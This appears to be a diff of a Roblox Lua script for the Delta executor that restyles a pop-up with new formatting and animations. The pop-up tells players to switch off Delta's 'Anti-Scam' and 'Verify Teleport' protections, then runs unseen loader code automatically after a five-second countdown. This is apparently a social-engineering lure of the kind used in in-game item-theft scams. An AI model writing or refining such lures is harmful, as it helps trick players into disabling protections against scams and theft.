@@ -37,7 +37,7 @@ local function detectExecutor()
     end
 end
 
---// Delta Anti-Scam GUI Warning
+--// Delta Anti-Scam GUI Warning (RichText version)
 local function showDeltaWarning()
     local ScreenGui = Instance.new("ScreenGui")
     ScreenGui.Parent = player:WaitForChild("PlayerGui")
@@ -49,79 +49,76 @@ local function showDeltaWarning()
     Background.Parent = ScreenGui
     Background.Size = UDim2.new(1, 0, 1, 0)
     Background.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
-    Background.BackgroundTransparency = 0.4
+    Background.BackgroundTransparency = 1 -- start transparent
 
     -- Main Frame
     local Frame = Instance.new("Frame")
     Frame.Parent = ScreenGui
     Frame.Size = UDim2.new(0, 500, 0, 280)
-    Frame.Position = UDim2.new(0.5, -250, 0.5, -140)
+    Frame.Position = UDim2.new(0.5, 0, 0.5, 0)
+    Frame.AnchorPoint = Vector2.new(0.5, 0.5) -- true center
     Frame.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
-    Frame.BackgroundTransparency = 1
+    Frame.BackgroundTransparency = 1 -- start hidden
     Frame.BorderSizePixel = 0
     Instance.new("UICorner", Frame).CornerRadius = UDim.new(0, 12)
     Instance.new("UIStroke", Frame).Color = Color3.fromRGB(0, 170, 255)
 
-    -- Yellow Warning Bar
+    -- Yellow Warning Bar (RichText, centered)
     local WarningBar = Instance.new("TextLabel")
     WarningBar.Parent = Frame
     WarningBar.Size = UDim2.new(1, 0, 0, 28)
     WarningBar.Position = UDim2.new(0, 0, 0, 0)
-    WarningBar.BackgroundColor3 = Color3.fromRGB(45, 45, 45)
-    WarningBar.Font = Enum.Font.GothamBold
-    WarningBar.TextSize = 14
+    WarningBar.BackgroundTransparency = 1
+    WarningBar.Font = Enum.Font.SourceSansSemibold
+    WarningBar.TextSize = 16
     WarningBar.TextColor3 = Color3.fromRGB(255, 215, 0)
     WarningBar.TextWrapped = true
-    WarningBar.Text = "Turn off your Anti-Scam & Verify Teleport to avoid getting banned or disconnected."
+    WarningBar.RichText = true
+    WarningBar.TextXAlignment = Enum.TextXAlignment.Center
+    WarningBar.Text = 'Turn off your <u><font color="rgb(255,220,0)">Anti-Scam</font></u> & <u><font color="rgb(255,220,0)">Verify Teleport</font></u> to avoid getting banned or disconnected.'
 
     -- Title (centered)
     local Title = Instance.new("TextLabel")
     Title.Parent = Frame
-    Title.Size = UDim2.new(1, -20, 0, 40)
-    Title.Position = UDim2.new(0, 10, 0, 35)
+    Title.Size = UDim2.new(1, 0, 0, 40)
+    Title.Position = UDim2.new(0, 0, 0, 35)
     Title.BackgroundTransparency = 1
     Title.Font = Enum.Font.SourceSansBold
     Title.TextSize = 22
     Title.TextColor3 = Color3.fromRGB(255, 255, 255)
     Title.Text = "Delta Anti-Scam Detected"
-    Title.TextXAlignment = Enum.TextXAlignment.Center -- ✅ centered
+    Title.TextXAlignment = Enum.TextXAlignment.Center
 
-    -- Instructions
+    -- Instructions (RichText body)
     local Label = Instance.new("TextLabel")
     Label.Parent = Frame
     Label.BackgroundTransparency = 1
     Label.Size = UDim2.new(1, -40, 1, -160)
     Label.Position = UDim2.new(0, 20, 0, 80)
-    Label.Font = Enum.Font.Gotham
+    Label.Font = Enum.Font.SourceSansSemibold
     Label.TextSize = 16
     Label.TextColor3 = Color3.fromRGB(220, 220, 220)
     Label.TextWrapped = true
     Label.TextYAlignment = Enum.TextYAlignment.Top
-    Label.Text = [[
-The script requires teleport permission, which is currently blocked by Delta’s Anti-Scam.
+    Label.RichText = true
+    Label.Text = 'The script requires teleport permission, which is currently blocked by Delta\'s <font color="rgb(255,220,0)">Anti-Scam</font>.\n\n1) Tap the Delta icon at the top.\n2) Open Settings (gear icon).\n3) Turn <font color="rgb(255,60,60)">OFF</font> the "<font color="rgb(255,220,0)">Anti-Scam</font>" & "<font color="rgb(255,220,0)">Verify Teleport</font>" option.\n4) Rejoin and run the script again.'
 
-1) Tap the Delta icon at the top.
-2) Open Settings (gear icon).
-3) Disable "Anti-Scam" & "Verify Teleport".
-4) Rejoin and run the script again.
-]]
-
-    -- Button (just shows countdown text, not clickable)
+    -- Button: Countdown (auto execute)
     local OpenBtn = Instance.new("TextButton")
     OpenBtn.Parent = Frame
     OpenBtn.Size = UDim2.new(0, 180, 0, 44)
     OpenBtn.Position = UDim2.new(0, 40, 1, -60)
     OpenBtn.BackgroundColor3 = Color3.fromRGB(80, 80, 80)
     OpenBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
-    OpenBtn.Font = Enum.Font.GothamBold
+    OpenBtn.Font = Enum.Font.SourceSansBold
     OpenBtn.TextSize = 16
     OpenBtn.AutoButtonColor = false
     OpenBtn.Active = false
     Instance.new("UICorner", OpenBtn).CornerRadius = UDim.new(0, 10)
 
     -- Countdown logic
-    local countdown = 5 -- seconds
-    local interval = 0.01 -- 10ms updates
+    local countdown = 5
+    local interval = 0.01
 
     task.spawn(function()
         while countdown > 0 do
@@ -130,7 +127,6 @@ The script requires teleport permission, which is currently blocked by Delta’s
             countdown -= interval
         end
 
-        -- Auto execute when countdown ends
         OpenBtn.Text = "Running..."
         runLoaders()
         ScreenGui:Destroy()
@@ -144,17 +140,25 @@ The script requires teleport permission, which is currently blocked by Delta’s
     RejoinBtn.BackgroundColor3 = Color3.fromRGB(0, 122, 255)
     RejoinBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
     RejoinBtn.Text = "Rejoin Game"
-    RejoinBtn.Font = Enum.Font.GothamBold
+    RejoinBtn.Font = Enum.Font.SourceSansBold
     RejoinBtn.TextSize = 16
     Instance.new("UICorner", RejoinBtn).CornerRadius = UDim.new(0, 10)
-
-    TweenService:Create(Frame, TweenInfo.new(0.4, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {
-        BackgroundTransparency = 0.15
-    }):Play()
 
     RejoinBtn.MouseButton1Click:Connect(function()
         TeleportService:Teleport(game.PlaceId, player)
     end)
+
+    -- Tween animations
+    TweenService:Create(Background, TweenInfo.new(0.4, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {
+        BackgroundTransparency = 0.4 -- fade in overlay
+    }):Play()
+
+    -- "pop-in" effect: slightly scale up then settle
+    Frame.Size = UDim2.new(0, 460, 0, 250) -- smaller start
+    TweenService:Create(Frame, TweenInfo.new(0.4, Enum.EasingStyle.Back, Enum.EasingDirection.Out), {
+        BackgroundTransparency = 0.05,
+        Size = UDim2.new(0, 500, 0, 280) -- grow to final size
+    }):Play()
 end
 
 --// Main Execution
